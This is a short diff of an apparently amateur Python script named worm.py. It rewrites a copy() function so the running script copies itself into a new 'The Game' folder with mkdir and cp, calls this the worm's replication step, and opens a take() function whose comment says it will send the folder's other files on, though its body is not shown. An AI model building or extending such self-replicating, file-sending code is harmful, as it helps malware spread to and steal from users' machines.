@@ -53,7 +53,7 @@ def wiggle():
     #the computer is linux 
     if(system == "Linux"):
         #get the current location
-        currentpath = os.path.abspath("worm.py") #im gonna ignore this for now <3
+        #currentpath = os.path.abspath("worm.py") #im gonna ignore this for now <3
 
         #need the username to properly get pathway names
         username = os.getlogin()
@@ -78,30 +78,20 @@ def wiggle():
             copy()
 
 def copy():
-    #going to copy the worm to the folder that it is currently in 
 
-    #going to scan the folder to make sure it is not already copied
-    os.path.exists("worm.py")
+    #code begins the copy function of the worm which allows it to replicate on the users computer
+    
+    #began the worm copy method
+    script = argv
 
-    #if it is in the directory
-    if os.path.exists("worm.py"):
-        print ("yes")
+    #setting this to a name 
+    name = str(script[0])
 
-    else:
-        #get the current location - do I Need the current location
-        location = os.path.abspath(worm.py)
-
-        #began the worm copy method
-        script = arg
-
-        #setting this to a name 
-        name = str(script[0])
-
-        #going to create the directory twice
-        for i in range(0,1):
-            directoryName = 'The Game'
-            subprocess.call(['mkdir', directoryName])
-            subprocess.call(['cp',name, directoryName])
+    #going to create the directory twice
+    for i in range(0,1):
+        directoryName = 'The Game'
+        subprocess.call(['mkdir', directoryName])
+        subprocess.call(['cp',name, directoryName])
 
 def take():
     #the take method will create a file and send all the other files in that folder
